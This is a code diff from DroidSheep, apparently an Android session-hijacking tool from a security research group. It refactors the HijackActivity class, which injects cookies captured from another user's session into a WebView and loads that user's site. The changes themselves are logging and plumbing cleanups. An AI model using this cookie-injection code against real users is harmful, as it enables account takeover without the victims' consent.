@@ -43,10 +43,11 @@ import android.widget.EditText;
 import android.widget.Toast;
 import de.trier.infsec.koch.droidsheep.R;
 import de.trier.infsec.koch.droidsheep.auth.Auth;
+import de.trier.infsec.koch.droidsheep.helper.Constants;
 import de.trier.infsec.koch.droidsheep.helper.DBHelper;
 import de.trier.infsec.koch.droidsheep.objects.CookieWrapper;
 
-public class HijackActivity extends Activity {
+public class HijackActivity extends Activity implements Constants {
 	private WebView webview = null;
 	private Auth authToHijack = null;
 
@@ -59,27 +60,27 @@ public class HijackActivity extends Activity {
 	}
 
 	private void setupCookies() {
-		Log.i("FS", "######################## COOKIE SETUP ###############################");
+		Log.i(APPLICATION_TAG, "######################## COOKIE SETUP ###############################");
 		CookieManager manager = CookieManager.getInstance();
-		Log.i("FS", "Cookiemanager has cookies: " + (manager.hasCookies() ? "YES" : "NO"));
+		Log.i(APPLICATION_TAG, "Cookiemanager has cookies: " + (manager.hasCookies() ? "YES" : "NO"));
 		if (manager.hasCookies()) {
 			manager.removeAllCookie();
 			try {
 				Thread.sleep(3000);
 			} catch (InterruptedException e) {
 			}
-			Log.i("FS", "Cookiemanager has still cookies: " + (manager.hasCookies() ? "YES" : "NO"));
+			Log.i(APPLICATION_TAG, "Cookiemanager has still cookies: " + (manager.hasCookies() ? "YES" : "NO"));
 		}
-		Log.i("FS", "######################## COOKIE SETUP START ###############################");
+		Log.i(APPLICATION_TAG, "######################## COOKIE SETUP START ###############################");
 		for (CookieWrapper cookieWrapper : authToHijack.getCookies()) {
 			Cookie cookie = cookieWrapper.getCookie();
 			String cookieString = cookie.getName() + "=" + cookie.getValue() + "; domain=" + cookie.getDomain() + "; Path="
 					+ cookie.getPath();
-			Log.i("FS", "Setting up cookie: " + cookieString);
+			Log.i(APPLICATION_TAG, "Setting up cookie: " + cookieString);
 			manager.setCookie(cookie.getDomain(), cookieString);
 		}
 		CookieSyncManager.getInstance().sync();
-		Log.i("FS", "######################## COOKIE SETUP DONE ###############################");
+		Log.i(APPLICATION_TAG, "######################## COOKIE SETUP DONE ###############################");
 	}
 
 	@Override
@@ -91,7 +92,6 @@ public class HijackActivity extends Activity {
 	}
 
 	private void setupWebView() {
-		//		webview = new WebView(this);
 		webview = (WebView) findViewById(R.id.webviewhijack);
 		webview.setWebViewClient(new MyWebViewClient());
 		WebSettings webSettings = webview.getSettings();
@@ -127,7 +127,6 @@ public class HijackActivity extends Activity {
 		return true;
 	}
 
-	//Menü Actions
 	@Override
 	public boolean onOptionsItemSelected(MenuItem item) {
 		switch (item.getItemId()) {
@@ -175,8 +174,9 @@ public class HijackActivity extends Activity {
 	@Override
 	protected void onStart() {
 		super.onStart();
-		int key = this.getIntent().getExtras().getInt("ID");
-		this.authToHijack = ListenActivity.authList.get(key);
+		
+		Object o = this.getIntent().getExtras().getSerializable(ListenActivity.BUNDLE_KEY_AUTH);
+		authToHijack = (Auth) o;
 
 		if (authToHijack == null) {
 			Toast.makeText(this, "Sorry, there was an error loading this Authentication", Toast.LENGTH_LONG).show();
@@ -188,12 +188,6 @@ public class HijackActivity extends Activity {
 		String url = mobile ? authToHijack.getMobileUrl() : authToHijack.getUrl();
 
 		setupWebView();
-		//		getWindow().requestFeature(Window.FEATURE_PROGRESS);
-		//		setContentView(R.layout.webview);
-		//		LinearLayout layout = (LinearLayout) findViewById(R.id.hijack);
-		//		layout.removeAllViews();
-		//		layout.addView(webview);
-
 		setupCookies();
 		webview.loadUrl(url);
 	}
